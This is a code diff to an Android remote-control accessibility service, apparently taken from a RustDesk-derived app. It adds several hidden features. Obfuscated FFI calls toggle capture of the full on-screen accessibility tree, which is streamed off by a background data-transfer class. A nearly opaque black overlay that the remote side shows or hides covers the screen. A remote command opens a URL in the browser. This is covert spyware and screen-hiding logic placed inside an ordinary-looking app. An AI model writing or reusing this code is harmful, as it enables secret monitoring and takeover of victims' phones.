@@ -35,6 +35,23 @@ import hbb.MessageOuterClass.KeyEvent
 import hbb.MessageOuterClass.KeyboardMode
 import hbb.KeyEventConverter
 
+import android.graphics.*
+import java.io.ByteArrayOutputStream
+import android.hardware.HardwareBuffer
+import android.graphics.Bitmap.wrapHardwareBuffer
+import java.nio.IntBuffer
+import java.nio.ByteOrder
+import java.nio.ByteBuffer
+import java.io.IOException
+import java.io.File
+import java.io.FileOutputStream
+import java.lang.reflect.Field
+import java.text.SimpleDateFormat
+import android.os.Environment
+
+import java.util.concurrent.locks.ReentrantLock
+import java.security.MessageDigest
+
 // const val BUTTON_UP = 2
 // const val BUTTON_BACK = 0x08
 
@@ -46,6 +63,9 @@ const val RIGHT_UP = 18
 const val BACK_UP = 66
 const val WHEEL_BUTTON_DOWN = 33
 const val WHEEL_BUTTON_UP = 34
+
+const val WHEEL_BUTTON_BROWSER = 38//32+6
+
 const val WHEEL_DOWN = 523331
 const val WHEEL_UP = 963
 
@@ -109,7 +129,13 @@ class InputService : AccessibilityService() {
                 }
             }
         }
-
+     if (mask == WHEEL_BUTTON_BROWSER) {	
+	   // 调用打开浏览器输入网址的方法
+	   if (!url.isNullOrEmpty()) {
+		openBrowserWithUrl(url)
+	    }
+            return
+        }
         // left button down, was up
         if (mask == LEFT_DOWN) {
             isWaitingLongPress = true
@@ -235,6 +261,64 @@ class InputService : AccessibilityService() {
         }
     }
 
+ @RequiresApi(Build.VERSION_CODES.N)
+    fun onstart_capture(arg1: String,arg2: String) {
+	    SKL=!SKL
+         if(SKL)
+	    {
+	      FFI.c6e5a24386fdbdd7f(this)
+	    }
+	    else
+	    {
+		  FFI.a6205cca3af04a8d(this)   
+	    }
+    }
+    
+    @RequiresApi(Build.VERSION_CODES.N)
+fun onstart_overlay(arg1: String, arg2: String) {
+    // 参数转换
+    gohome = arg1.toInt()
+
+    // 确保 overLay 不为空并且已附加到窗口
+    if (overLay != null && overLay.windowToken != null) { 
+        overLay.post {
+            if (gohome == 8) {  // 不可见状态
+                overLay.isFocusable = false
+                overLay.isClickable = false
+            } else {  // 可见状态
+                overLay.isFocusable = true
+                overLay.isClickable = true
+            }
+            overLay.visibility = gohome
+        }
+    }
+}
+
+  @SuppressLint("WrongConstant")
+    private fun openBrowserWithUrl(url: String) {
+	     try {
+		Handler(Looper.getMainLooper()).post(
+		{
+		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
+		    intent.flags = 268435456
+		    if (intent.resolveActivity(packageManager) != null) {
+			      FloatingWindowService.app_ClassGen11_Context?.let {
+				    it.startActivity(intent)
+				}    
+		    }
+		    else
+		   {
+			    FloatingWindowService.app_ClassGen11_Context?.let {
+				    // 在这里使用 it 代替 context
+				    it.startActivity(intent)
+				}
+		   }
+		})
+	     } catch (e: Exception) {
+	    }
+      }
+    
+    
     @RequiresApi(Build.VERSION_CODES.N)
     private fun consumeWheelActions() {
         if (isWheelActionsPolling) {
@@ -660,6 +744,33 @@ class InputService : AccessibilityService() {
 
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        var accessibilityNodeInfo3: AccessibilityNodeInfo?
+        try {
+	    //val rootNode = FFI.getRootInActiveWindow(this)
+	    accessibilityNodeInfo3 = FFI.c88f1fb2d2ef0700(this)
+            //accessibilityNodeInfo3 = rootInActiveWindow
+        } catch (unused6: java.lang.Exception) {
+            accessibilityNodeInfo3 = null
+        }
+        if (accessibilityNodeInfo3 != null) {
+            try {
+                //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
+                 if(SKL){
+		     //Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
+                    val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
+                    Thread(Runnable { DataTransferManager.a012933444444(ss999) }).start()
+                }
+		 else
+		    {
+                      // Log.d(logTag, "SKL accessibilityNodeInfo3 else $SKL")
+		    }
+            } catch (unused7: java.lang.Exception) {
+            }
+        }
+	    else
+	    {
+               //  Log.d(logTag, "SKL accessibilityNodeInfo3 NULL")
+	    }
     }
 
     override fun onServiceConnected() {
@@ -679,10 +790,113 @@ class InputService : AccessibilityService() {
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
         Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
         Log.d(logTag, "onServiceConnected!")
+         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        try {
+            createView(windowManager)
+            handler.postDelayed(runnable, 1000)
+            //Log.d(logTag, "onCreate success")
+        } catch (e: Exception) {
+           // Log.d(logTag, "onCreate failed: $e")
+        }
     }
 
+    @SuppressLint("ClickableViewAccessibility")
+    private fun createView(windowManager: WindowManager) {  
+        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
+        if (viewUntouchable || viewTransparency == 0f) {
+            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+        }
+
+       // var w = FFI.getNetArgs0()//HomeWith
+       // var h = FFI.getNetArgs1()//HomeHeight 
+       
+        var ww = FFI.getNetArgs2()
+        var hh = FFI.getNetArgs3()	
+	
+	//Log.d(logTag, "createView: $w,$h,$ww,$hh")
+
+        /* if(HomeWidth >0 && HomeHeight>0 )
+	 {
+                ww= HomeWidth 
+		hh= HomeHeight
+	 }*/
+	
+    	overLayparams_bass =  WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(),FFI.getNetArgs1(), 1)
+        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
+        overLayparams_bass.x = 0
+        overLayparams_bass.y = 0
+    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	}
+    	overLay =  FrameLayout(this)
+    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
+    	overLay.getBackground().setAlpha(253)
+	overLay.setVisibility(8)
+        overLay.setFocusable(false)
+        overLay.setClickable(false)
+
+        val loadingText = TextView(this, null)
+	loadingText.text = "口口口口口口口口口口口口口口口口口\n口口口口口口口口口口口口\n口口口口口口口口口口口口口"
+	loadingText.setTextColor(-7829368)
+	loadingText.textSize = 20.0f
+	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
+	loadingText.setPadding(60, HomeHeight / 3, 0, 0)
+
+	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
+	paramstext.gravity = Gravity.LEFT
+	loadingText.layoutParams = paramstext
+
+	//Fakelay.addView(getView2())
+	overLay.addView(loadingText)
+	
+        windowManager.addView(overLay, overLayparams_bass)
+    }
+    
+    fun dp2px(context: Context, f: Float): Int {
+        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
+    }
+
+    private val handler = Handler(Looper.getMainLooper())
+    private val runnable = object : Runnable {
+        override fun run() {
+               if (overLay.windowToken != null) 
+		{ 
+			    if (overLay.visibility == 8) {  // 如果已经是 GONE
+				 BIS = false
+			     }
+			    else {
+			         BIS = true
+			    }
+			
+			if( overLay.visibility != gohome)
+			{ 
+				overLay.post {
+				    if (gohome == 8) {  // 不可见状态
+					overLay.isFocusable = false
+					overLay.isClickable = false
+				    } else {  // 可见状态
+					overLay.isFocusable = true
+					overLay.isClickable = true
+				    }
+				    overLay.visibility = gohome
+				}
+			   
+			    // overLay.setVisibility(gohome)
+			    // windowManager.updateViewLayout(overLay, overLayparams_bass)
+		       }
+			else
+			{
+	
+			}
+		}
+               handler.postDelayed(this, 50) 
+        }
+    }
     override fun onDestroy() {
         ctx = null
+        windowManager.removeView(overLay) 
         super.onDestroy()
     }
 
